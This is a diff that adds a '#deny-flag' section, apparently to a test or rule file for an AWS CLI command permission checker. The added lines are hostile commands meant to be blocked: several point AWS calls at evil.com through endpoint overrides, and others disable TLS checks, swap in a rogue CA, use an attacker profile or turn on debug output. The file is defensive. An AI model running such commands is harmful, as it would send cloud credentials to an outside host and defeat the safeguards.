@@ -45,3 +45,15 @@ aws dynamodb scan --table-name t
 
 #override aws:ssm.get-parameter
 aws ssm get-parameter --name p --with-decryption
+
+#deny-flag
+aws --endpoint-url=http://evil.com sts get-caller-identity
+aws --endpoint-url http://evil.com ec2 describe-instances
+aws --no-verify-ssl s3 ls
+aws --ca-bundle /evil/ca.crt ec2 describe-instances
+aws --no-sign-request s3 ls
+aws --profile attacker iam list-users
+aws --debug sts get-caller-identity
+aws ec2 describe-instances --cli-input-json file://payload.json
+AWS_ENDPOINT_URL=http://evil.com aws sts get-caller-identity
+AWS_ENDPOINT_URL_S3=http://evil.com aws s3 ls
